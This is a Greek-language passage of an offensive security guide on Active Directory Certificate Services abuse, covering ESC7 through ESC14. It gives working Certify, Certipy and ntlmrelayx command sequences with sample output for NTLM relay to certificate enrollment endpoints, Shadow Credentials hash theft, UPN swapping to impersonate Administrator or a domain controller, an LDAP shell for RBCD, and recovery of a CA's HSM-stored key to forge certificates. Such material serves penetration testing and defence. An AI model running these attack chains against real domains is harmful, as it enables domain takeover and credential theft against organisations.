Εκτός από τα κλασικά ESC7 abuses (ενεργοποίηση attributes EDITF ή έγκριση εκκρεμών αιτημάτων), το **Certify 2.0** αποκάλυψε ένα ολοκαίνουργιο primitive που απαιτεί μόνο τον ρόλο *Manage Certificates* (γνωστό και ως ρόλος **Certificate Manager / Officer**) στο Enterprise CA.<sup>[[3]](#references)</sup>

Η RPC μέθοδος `ICertAdmin::SetExtension` μπορεί να εκτελεστεί από οποιοδήποτε principal διαθέτει *Manage Certificates*. Ενώ παραδοσιακά η μέθοδος χρησιμοποιούνταν από νόμιμα CAs για την ενημέρωση extensions σε **εκκρεμή** αιτήματα, ένας attacker μπορεί να την εκμεταλλευτεί για να **προσθέσει ένα *μη προεπιλεγμένο* certificate extension** (για παράδειγμα, ένα custom *Certificate Issuance Policy* OID όπως το `1.1.1.1`) σε ένα αίτημα που αναμένει έγκριση.

Επειδή το στοχευμένο template **δεν ορίζει προεπιλεγμένη τιμή για το συγκεκριμένο extension**, το CA **ΔΕΝ** θα αντικαταστήσει την τιμή που ελέγχει ο attacker όταν εκδοθεί τελικά το αίτημα. Το resulting certificate επομένως περιέχει ένα extension που επέλεξε ο attacker και μπορεί να:

* Ικανοποιεί requirements Application / Issuance Policy άλλων vulnerable templates (οδηγώντας σε privilege escalation).
* Εισάγει πρόσθετα EKUs ή policies που παρέχουν στο certificate απρόσμενη εμπιστοσύνη σε third-party systems.

Με λίγα λόγια, το *Manage Certificates* – που προηγουμένως θεωρούνταν το «λιγότερο ισχυρό» μισό του ESC7 – μπορεί πλέον να αξιοποιηθεί για πλήρες privilege escalation ή μακροχρόνιο persistence, χωρίς αλλαγές στη ρύθμιση του CA ή την απαίτηση του πιο περιοριστικού δικαιώματος *Manage CA*.

#### Abuse του primitive με Certify 2.0

1. **Υποβάλετε ένα certificate request που θα παραμείνει *pending*.** Αυτό μπορεί να επιτευχθεί με ένα template που απαιτεί έγκριση manager:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Προσθέστε ένα custom extension στο pending request** χρησιμοποιώντας τη νέα εντολή `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Εάν το template δεν ορίζει ήδη το extension *Certificate Issuance Policies*, η παραπάνω τιμή θα διατηρηθεί μετά την έκδοση.*

3. **Εκδώστε το request** (εάν ο ρόλος σας διαθέτει επίσης δικαιώματα έγκρισης *Manage Certificates*) ή περιμένετε από έναν operator να το εγκρίνει. Μόλις εκδοθεί, κατεβάστε το certificate:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Το resulting certificate περιέχει πλέον το malicious issuance-policy OID και μπορεί να χρησιμοποιηθεί σε επόμενα attacks (π.χ. ESC13, domain escalation κ.λπ.).

> ΣΗΜΕΙΩΣΗ: Το ίδιο attack μπορεί να εκτελεστεί με το Certipy ≥ 4.7 μέσω της εντολής `ca` και της παραμέτρου `-set-extension`.

## NTLM Relay σε AD CS HTTP Endpoints – ESC8

### Επεξήγηση

> [!TIP]
> Σε environments όπου είναι εγκατεστημένο το **AD CS**, εάν υπάρχει ένα **web enrollment endpoint με vulnerability** και έχει δημοσιευτεί τουλάχιστον ένα **certificate template** που επιτρέπει enrollment από domain computers και client authentication (όπως το προεπιλεγμένο **`Machine`** template), καθίσταται δυνατή η **compromise οποιουδήποτε computer με ενεργή την υπηρεσία spooler από έναν attacker**!

Το AD CS υποστηρίζει αρκετές **HTTP-based enrollment methods**, οι οποίες παρέχονται μέσω πρόσθετων server roles που μπορεί να εγκαταστήσουν οι administrators. Αυτά τα interfaces για HTTP-based certificate enrollment είναι ευάλωτα σε **NTLM relay attacks**. Ένας attacker, από ένα **compromised machine, μπορεί να impersonate οποιοδήποτε AD account που κάνει authentication μέσω inbound NTLM**. Ενώ impersonates το victim account, ο attacker μπορεί να αποκτήσει πρόσβαση σε αυτά τα web interfaces και να **ζητήσει ένα client authentication certificate χρησιμοποιώντας τα `User` ή `Machine` certificate templates**.

- Το **web enrollment interface** (μια παλαιότερη ASP application διαθέσιμη στο `http://<caserver>/certsrv/`) χρησιμοποιεί από προεπιλογή μόνο HTTP, το οποίο δεν παρέχει προστασία από NTLM relay attacks. Επιπλέον, επιτρέπει ρητά μόνο NTLM authentication μέσω του Authorization HTTP header, καθιστώντας μη εφαρμόσιμες πιο secure authentication methods όπως το Kerberos.
- Το **Certificate Enrollment Service** (CES), το **Certificate Enrollment Policy** (CEP) Web Service και το **Network Device Enrollment Service** (NDES) υποστηρίζουν από προεπιλογή negotiate authentication μέσω του Authorization HTTP header. Το negotiate authentication **υποστηρίζει τόσο Kerberos όσο και **NTLM**, επιτρέποντας σε έναν attacker να κάνει **downgrade σε NTLM** authentication κατά τη διάρκεια relay attacks. Παρότι αυτά τα web services ενεργοποιούν από προεπιλογή το HTTPS, το HTTPS από μόνο του **δεν προστατεύει από NTLM relay attacks**. Προστασία από NTLM relay attacks για HTTPS services είναι δυνατή μόνο όταν το HTTPS συνδυάζεται με channel binding. Δυστυχώς, το AD CS δεν ενεργοποιεί το Extended Protection for Authentication στο IIS, το οποίο απαιτείται για το channel binding.<sup>[[6]](#references)</sup>

Ένα συνηθισμένο **πρόβλημα** με τα NTLM relay attacks είναι η **μικρή διάρκεια των NTLM sessions** και η αδυναμία του attacker να αλληλεπιδράσει με services που **απαιτούν NTLM signing**.

Ωστόσο, αυτός ο περιορισμός παρακάμπτεται μέσω της εκμετάλλευσης ενός NTLM relay attack για την απόκτηση certificate για τον user, καθώς η περίοδος ισχύος του certificate καθορίζει τη διάρκεια του session και το certificate μπορεί να χρησιμοποιηθεί με services που **επιβάλλουν NTLM signing**. Για οδηγίες σχετικά με τη χρήση ενός stolen certificate, ανατρέξτε στο:


{{#ref}}
account-persistence.md
{{#endref}}

Ένας ακόμη περιορισμός των NTLM relay attacks είναι ότι **ένα machine που ελέγχεται από τον attacker πρέπει να γίνει authenticated από ένα victim account**. Ο attacker μπορεί είτε να περιμένει είτε να προσπαθήσει να **εξαναγκάσει** αυτό το authentication:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

Η `cas` του [**Certify**](https://github.com/GhostPack/Certify) enumerates τα **enabled HTTP AD CS endpoints**:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Η ιδιότητα `msPKI-Enrollment-Servers` χρησιμοποιείται από enterprise Certificate Authorities (CAs) για την αποθήκευση endpoints του Certificate Enrollment Service (CES). Αυτά τα endpoints μπορούν να αναλυθούν και να εμφανιστούν χρησιμοποιώντας το εργαλείο **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Κατάχρηση με Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Κατάχρηση με [Certipy](https://github.com/ly4k/Certipy)

Το αίτημα για πιστοποιητικό πραγματοποιείται από το Certipy, από προεπιλογή, με βάση το template `Machine` ή `User`, ανάλογα με το αν το όνομα του account που γίνεται relay καταλήγει σε `$`. Ο καθορισμός ενός εναλλακτικού template μπορεί να επιτευχθεί μέσω της χρήσης της παραμέτρου `-template`.

Στη συνέχεια μπορεί να χρησιμοποιηθεί μια τεχνική όπως το [PetitPotam](https://github.com/ly4k/PetitPotam) για τον εξαναγκασμό authentication. Όταν πρόκειται για domain controllers, απαιτείται ο καθορισμός του `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Χωρίς Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Επεξήγηση

Η νέα τιμή **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) για το **`msPKI-Enrollment-Flag`**, που αναφέρεται ως ESC9, αποτρέπει την ενσωμάτωση του **νέου `szOID_NTDS_CA_SECURITY_EXT` security extension** σε ένα certificate. Αυτό το flag αποκτά σημασία όταν το `StrongCertificateBindingEnforcement` έχει οριστεί σε `1` (την προεπιλεγμένη ρύθμιση), σε αντίθεση με τη ρύθμιση `2`. Η σημασία του αυξάνεται σε σενάρια όπου θα μπορούσε να γίνει exploit μιας weaker certificate mapping για Kerberos ή Schannel (όπως στο ESC10), καθώς η απουσία του ESC9 δεν θα άλλαζε τις απαιτήσεις.<sup>[[7]](#references)</sup>

Οι συνθήκες υπό τις οποίες η ρύθμιση αυτού του flag αποκτά σημασία περιλαμβάνουν:

- Το `StrongCertificateBindingEnforcement` δεν έχει προσαρμοστεί σε `2` (με προεπιλογή το `1`) ή το `CertificateMappingMethods` περιλαμβάνει το `UPN` flag.
- Το certificate έχει επισημανθεί με το `CT_FLAG_NO_SECURITY_EXTENSION` flag στη ρύθμιση `msPKI-Enrollment-Flag`.
- Ένα client authentication EKU καθορίζεται από το certificate.
- Υπάρχουν δικαιώματα `GenericWrite` σε οποιοδήποτε account, ώστε να γίνει compromise κάποιου άλλου.

### Σενάριο Abuse

Ας υποθέσουμε ότι το `John@corp.local` έχει δικαιώματα `GenericWrite` στο `Jane@corp.local`, με στόχο το compromise του `Administrator@corp.local`. Το `ESC9` certificate template, στο οποίο επιτρέπεται στη `Jane@corp.local` να κάνει enroll, έχει ρυθμιστεί με το `CT_FLAG_NO_SECURITY_EXTENSION` flag στη ρύθμιση `msPKI-Enrollment-Flag`.

Αρχικά, αποκτάται το hash της `Jane` με τη χρήση Shadow Credentials, χάρη στο `GenericWrite` του `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Στη συνέχεια, το `userPrincipalName` της `Jane` τροποποιείται σε `Administrator`, παραλείποντας σκόπιμα το τμήμα domain `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Αυτή η τροποποίηση δεν παραβιάζει τους περιορισμούς, καθώς το `Administrator@corp.local` παραμένει διαφορετικό ως `Administrator`'s `userPrincipalName`.

Στη συνέχεια, το πρότυπο πιστοποιητικού `ESC9`, το οποίο έχει επισημανθεί ως ευάλωτο, ζητείται ως `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Σημειώνεται ότι το `userPrincipalName` του certificate αντικατοπτρίζει το `Administrator`, χωρίς κανένα “object SID”.

Στη συνέχεια, το `userPrincipalName` της `Jane` επαναφέρεται στην αρχική του τιμή, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Η προσπάθεια authentication με το εκδοθέν certificate επιστρέφει πλέον το NT hash του `Administrator@corp.local`. Η εντολή πρέπει να περιλαμβάνει το `-domain <domain>`, επειδή το certificate δεν καθορίζει domain:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Αδύναμες αντιστοιχίσεις πιστοποιητικών - ESC10

### Επεξήγηση

Δύο τιμές κλειδιών registry στον domain controller αναφέρονται από το ESC10:

- Η προεπιλεγμένη τιμή για το `CertificateMappingMethods` κάτω από το `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` είναι `0x18` (`0x8 | 0x10`), ενώ προηγουμένως είχε οριστεί σε `0x1F`.
- Η προεπιλεγμένη ρύθμιση για το `StrongCertificateBindingEnforcement` κάτω από το `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` είναι `1`, ενώ προηγουμένως ήταν `0`.<sup>[[7]](#references)</sup>

**Περίπτωση 1**

Όταν το `StrongCertificateBindingEnforcement` έχει ρυθμιστεί σε `0`.

**Περίπτωση 2**

Εάν το `CertificateMappingMethods` περιλαμβάνει το bit `UPN` (`0x4`).

### Περίπτωση κατάχρησης 1

Με το `StrongCertificateBindingEnforcement` ρυθμισμένο σε `0`, ένας λογαριασμός A με δικαιώματα `GenericWrite` μπορεί να αξιοποιηθεί για την παραβίαση οποιουδήποτε λογαριασμού B.

Για παράδειγμα, έχοντας δικαιώματα `GenericWrite` πάνω στο `Jane@corp.local`, ένας attacker στοχεύει να παραβιάσει το `Administrator@corp.local`. Η διαδικασία είναι αντίστοιχη με το ESC9, επιτρέποντας τη χρήση οποιουδήποτε certificate template.

Αρχικά, το hash της `Jane` ανακτάται μέσω του Shadow Credentials, αξιοποιώντας το `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Στη συνέχεια, το `userPrincipalName` της `Jane` τροποποιείται σε `Administrator`, παραλείποντας σκόπιμα το τμήμα `@corp.local` για την αποφυγή παραβίασης περιορισμού.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Στη συνέχεια, ζητείται ένα πιστοποιητικό που επιτρέπει την ταυτοποίηση πελάτη ως `Jane`, χρησιμοποιώντας το προεπιλεγμένο πρότυπο `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Στη συνέχεια, το `userPrincipalName` της `Jane` επαναφέρεται στην αρχική του τιμή, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Η αυθεντικοποίηση με το πιστοποιητικό που αποκτήθηκε θα αποδώσει το NT hash του `Administrator@corp.local`, καθιστώντας απαραίτητο τον καθορισμό του domain στην εντολή, λόγω της απουσίας πληροφοριών domain στο πιστοποιητικό.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

Με το `CertificateMappingMethods` να περιέχει το bit flag `UPN` (`0x4`), ένας λογαριασμός A με δικαιώματα `GenericWrite` μπορεί να παραβιάσει οποιονδήποτε λογαριασμό B που δεν διαθέτει ιδιότητα `userPrincipalName`, συμπεριλαμβανομένων των λογαριασμών μηχανημάτων και του ενσωματωμένου διαχειριστή του domain `Administrator`.

Εδώ, ο στόχος είναι η παραβίαση του `DC$@corp.local`, ξεκινώντας με την απόκτηση του hash του `Jane` μέσω των Shadow Credentials, αξιοποιώντας το `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Στη συνέχεια, το `userPrincipalName` της `Jane` ορίζεται σε `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Ζητείται ένα πιστοποιητικό για client authentication ως `Jane`, χρησιμοποιώντας το προεπιλεγμένο template `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Το `userPrincipalName` της `Jane` επαναφέρεται στην αρχική του τιμή μετά από αυτήν τη διαδικασία.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Για την αυθεντικοποίηση μέσω Schannel, χρησιμοποιείται η επιλογή `-ldap-shell` του Certipy, υποδεικνύοντας επιτυχή αυθεντικοποίηση ως `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Μέσω του LDAP shell, εντολές όπως η `set_rbcd` επιτρέπουν επιθέσεις Resource-Based Constrained Delegation (RBCD), θέτοντας δυνητικά υπό τον έλεγχο τον domain controller.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Αυτή η ευπάθεια επεκτείνεται επίσης σε οποιονδήποτε λογαριασμό χρήστη δεν διαθέτει `userPrincipalName` ή όπου αυτό δεν αντιστοιχεί στο `sAMAccountName`, με τον προεπιλεγμένο `Administrator@corp.local` να αποτελεί κύριο στόχο λόγω των αυξημένων δικαιωμάτων LDAP και της απουσίας `userPrincipalName` από προεπιλογή.

## Relaying NTLM στο ICPR - ESC11

### Επεξήγηση

Εάν ο CA Server δεν έχει ρυθμιστεί με `IF_ENFORCEENCRYPTICERTREQUEST`, μπορούν να πραγματοποιηθούν NTLM relay attacks χωρίς signing μέσω της υπηρεσίας RPC. [Αναφορά εδώ](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Μπορείτε να χρησιμοποιήσετε το `certipy` για να ελέγξετε αν το `Enforce Encryption for Requests` είναι Disabled, και το certipy θα εμφανίσει ευπάθειες `ESC11`.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Σενάριο Abuse

Χρειάζεται να ρυθμιστεί ένας relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Σημείωση: Για τους domain controllers, πρέπει να καθορίσουμε το `-template` στο DomainController.

Ή χρησιμοποιώντας το fork του impacket από τον sploutchy:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Επεξήγηση

Οι administrators μπορούν να ρυθμίσουν το Certificate Authority ώστε να το αποθηκεύει σε μια εξωτερική συσκευή, όπως το "Yubico YubiHSM2".

Εάν μια USB συσκευή είναι συνδεδεμένη στον CA server μέσω θύρας USB ή σε έναν USB device server στην περίπτωση που ο CA server είναι virtual machine, απαιτείται ένα authentication key (μερικές φορές αναφέρεται ως "password") ώστε το Key Storage Provider να δημιουργεί και να χρησιμοποιεί keys στο YubiHSM.

Αυτό το key/password αποθηκεύεται στο registry, στη διαδρομή `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`, σε cleartext.

Reference [εδώ](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Σενάριο κατάχρησης

Εάν το private key του CA είναι αποθηκευμένο σε μια physical USB συσκευή όταν αποκτήσετε shell access, είναι πιθανό να ανακτηθεί το key.

Αρχικά, πρέπει να αποκτήσετε το CA certificate (είναι public) και στη συνέχεια:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Τέλος, χρησιμοποιήστε την εντολή `certutil -sign` για να πλαστογραφήσετε ένα νέο αυθαίρετο πιστοποιητικό χρησιμοποιώντας το πιστοποιητικό CA και το ιδιωτικό του κλειδί.

## OID Group Link Abuse - ESC13

### Επεξήγηση

Το attribute `msPKI-Certificate-Policy` επιτρέπει την προσθήκη της πολιτικής έκδοσης στο certificate template. Τα objects `msPKI-Enterprise-Oid`, τα οποία είναι υπεύθυνα για την έκδοση πολιτικών, μπορούν να εντοπιστούν στο Configuration Naming Context (`CN=OID,CN=Public Key Services,CN=Services`) του PKI OID container. Μια πολιτική μπορεί να συνδεθεί με ένα AD group μέσω του attribute `msDS-OIDToGroupLink` αυτού του object, επιτρέποντας σε ένα system να εξουσιοδοτήσει έναν χρήστη που παρουσιάζει το πιστοποιητικό σαν να ήταν μέλος του group. [Αναφορά εδώ](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Με άλλα λόγια, όταν ένας χρήστης έχει permission να κάνει enroll σε ένα certificate και το certificate είναι συνδεδεμένο με ένα OID group, ο χρήστης μπορεί να κληρονομήσει τα privileges αυτού του group.

Χρησιμοποιήστε το [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) για να βρείτε το OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Σενάριο κατάχρησης

Βρείτε ένα δικαίωμα χρήστη που μπορεί να χρησιμοποιηθεί με `certipy find` ή `Certify.exe find /showAllPermissions`.

Εάν ο `John` έχει δικαίωμα να κάνει enroll στο `VulnerableTemplate`, ο χρήστης μπορεί να κληρονομήσει τα privileges της ομάδας `VulnerableGroup`.

Το μόνο που χρειάζεται να κάνει είναι να καθορίσει το template· θα λάβει ένα certificate με δικαιώματα OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Ευάλωτη διαμόρφωση ανανέωσης πιστοποιητικών - ESC14

### Επεξήγηση

Η περιγραφή στη διεύθυνση https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping είναι εξαιρετικά αναλυτική. Παρακάτω παρατίθεται μετάφραση του αρχικού κειμένου.<sup>[[14]](#references)</sup>

Το ESC14 αφορά ευπάθειες που προκύπτουν από το «weak explicit certificate mapping», κυρίως μέσω της κακής χρήσης ή της μη ασφαλούς διαμόρφωσης του attribute `altSecurityIdentities` σε λογαριασμούς χρηστών ή υπολογιστών του Active Directory. Αυτό το attribute, το οποίο υποστηρίζει πολλαπλές τιμές, επιτρέπει στους διαχειριστές να συσχετίζουν χειροκίνητα πιστοποιητικά X.509 με έναν λογαριασμό AD για σκοπούς authentication. Όταν συμπληρώνεται, αυτά τα explicit mappings μπορούν να παρακάμψουν την προεπιλεγμένη λογική certificate mapping, η οποία συνήθως βασίζεται σε UPN ή DNS names στο SAN του πιστοποιητικού ή στο SID που περιέχεται στο security extension `szOID_NTDS_CA_SECURITY_EXT`.

Ένα mapping θεωρείται «weak» όταν η string value που χρησιμοποιείται μέσα στο attribute `altSecurityIdentities` για την αναγνώριση ενός πιστοποιητικού είναι υπερβολικά γενική, εύκολα προβλέψιμη, βασίζεται σε μη μοναδικά πεδία πιστοποιητικού ή χρησιμοποιεί components πιστοποιητικού που μπορούν εύκολα να πλαστογραφηθούν. Αν ένας attacker μπορέσει να αποκτήσει ή να δημιουργήσει ένα πιστοποιητικό του οποίου τα attributes ταιριάζουν με ένα weakly defined explicit mapping για έναν privileged account, μπορεί να χρησιμοποιήσει αυτό το πιστοποιητικό για authentication ως ο συγκεκριμένος λογαριασμός και για impersonation του.

Παραδείγματα δυνητικά weak `altSecurityIdentities` mapping strings περιλαμβάνουν:

- Mapping αποκλειστικά βάσει ενός κοινού Subject Common Name (CN): π.χ. `X509:<S>CN=SomeUser`. Ένας attacker μπορεί να είναι σε θέση να αποκτήσει ένα πιστοποιητικό με αυτό το CN από μια λιγότερο ασφαλή πηγή.
- Χρήση υπερβολικά γενικών Issuer Distinguished Names (DN) ή Subject DN χωρίς πρόσθετη εξειδίκευση, όπως συγκεκριμένο serial number ή subject key identifier: π.χ. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Χρήση άλλων προβλέψιμων patterns ή non-cryptographic identifiers, τα οποία ένας attacker μπορεί να είναι σε θέση να ικανοποιήσει σε ένα πιστοποιητικό που μπορεί να αποκτήσει νόμιμα ή να πλαστογραφήσει, αν έχει παραβιάσει ένα CA ή έχει εντοπίσει ένα vulnerable template όπως στο ESC1.

Το attribute `altSecurityIdentities` υποστηρίζει διάφορα formats για mapping, όπως:

- `X509:<I>IssuerDN<S>SubjectDN` (mapping βάσει του πλήρους Issuer και Subject DN)
- `X509:<SKI>SubjectKeyIdentifier` (mapping βάσει της τιμής του Subject Key Identifier extension του πιστοποιητικού)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapping βάσει serial number, το οποίο implicitly qualified από το Issuer DN) - αυτό δεν είναι standard format· συνήθως είναι `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapping βάσει ενός RFC822 name, συνήθως μιας email address, από το SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapping βάσει SHA1 hash του raw public key του πιστοποιητικού - γενικά strong)

Η ασφάλεια αυτών των mappings εξαρτάται σε μεγάλο βαθμό από την εξειδίκευση, τη μοναδικότητα και την cryptographic strength των επιλεγμένων certificate identifiers που χρησιμοποιούνται στο mapping string. Ακόμη και όταν είναι ενεργοποιημένα strong certificate binding modes στους Domain Controllers, τα οποία επηρεάζουν κυρίως τα implicit mappings που βασίζονται σε SAN UPN/DNS και στο SID extension, ένα poorly configured entry στο `altSecurityIdentities` μπορεί να αποτελέσει άμεση οδό για impersonation, αν η ίδια η mapping logic είναι ελαττωματική ή υπερβολικά permissive.

### Σενάριο κατάχρησης

Το ESC14 στοχεύει τα **explicit certificate mappings** στο Active Directory (AD), συγκεκριμένα το attribute `altSecurityIdentities`. Αν αυτό το attribute έχει οριστεί, είτε σκόπιμα είτε λόγω misconfiguration, οι attackers μπορούν να κάνουν impersonation λογαριασμών παρουσιάζοντας πιστοποιητικά που ταιριάζουν με το mapping.

#### Σενάριο A: Ο attacker μπορεί να γράψει στο `altSecurityIdentities`

**Προαπαιτούμενο**: Ο attacker διαθέτει write permissions στο attribute `altSecurityIdentities` του target account ή permission να του το εκχωρήσει με τη μορφή μίας από τις ακόλουθες permissions στο target AD object:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Σενάριο B: Ο target διαθέτει weak mapping μέσω X509RFC822 (Email)

- **Προαπαιτούμενο**: Ο target διαθέτει weak X509RFC822 mapping στο altSecurityIdentities. Ένας attacker μπορεί να ορίσει το mail attribute του victim ώστε να ταιριάζει με το X509RFC822 name του target, να κάνει enroll ένα certificate ως ο victim και να το χρησιμοποιήσει για authentication ως ο target.

#### Σενάριο C: Ο target διαθέτει X509IssuerSubject Mapping

- **Προαπαιτούμενο**: Ο target διαθέτει weak X509IssuerSubject explicit mapping στο `altSecurityIdentities`. Ο attacker μπορεί να ορίσει το attribute `cn` ή `dNSHostName` σε ένα victim principal ώστε να ταιριάζει με το subject του X509IssuerSubject mapping του target. Στη συνέχεια, ο attacker μπορεί να κάνει enroll ένα certificate ως ο victim και να χρησιμοποιήσει αυτό το πιστοποιητικό για authentication ως ο target.

#### Σενάριο D: Ο target διαθέτει X509SubjectOnly Mapping

- **Προαπαιτούμενο**: Ο target διαθέτει weak X509SubjectOnly explicit mapping στο `altSecurityIdentities`. Ο attacker μπορεί να ορίσει το attribute `cn` ή `dNSHostName` σε ένα victim principal ώστε να ταιριάζει με το subject του X509SubjectOnly mapping του target. Στη συνέχεια, ο attacker μπορεί να κάνει enroll ένα certificate ως ο victim και να χρησιμοποιήσει αυτό το πιστοποιητικό για authentication ως ο target.

### συγκεκριμένες λειτουργίες
#### Σενάριο A

Ζητήστε ένα certificate από το certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
